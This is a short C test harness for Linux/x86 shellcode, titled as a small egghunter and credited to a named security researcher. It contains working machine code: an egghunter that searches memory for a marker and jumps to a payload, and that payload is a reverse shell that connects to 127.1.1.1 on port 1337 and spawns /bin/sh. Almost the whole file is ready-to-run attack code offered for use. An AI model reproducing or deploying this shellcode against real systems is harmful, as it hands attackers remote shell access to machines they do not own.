/* 
 *  Title:    Small Egghunter - Segment Test
 *  Platform: Linux/x86
 *  Date:     2014-08-23
 *  Author:   Julien Ahrens (@MrTuxracer)
 *  Website:  http://www.rcesecurity.com 
 *
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define EGG "\x90\x4a\x90\x42"

unsigned char egg[] = EGG;

unsigned char egghunter[] = \
"\xe8\x12\x00\x00\x00\x58\xbb\x90\x4a\x90\x42\x40\x39\x18\x75\xfb\x39\x58\x04\x75\xf6\xff\xe0\xeb\xec";

unsigned char shellcode[] = \
"\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

main()
{
	printf("Egghunter Length:  %d\n", sizeof(egghunter) - 1);	
	
	char *heap;
	heap=malloc(300);

	printf("Memory location of shellcode: %p\n", heap);

	memcpy(heap, egg, 4);
	memcpy(heap+4, egg, 4);
	memcpy(heap+8, shellcode, sizeof(shellcode));

	int (*ret)() = (int(*)())egghunter;
	ret();
}
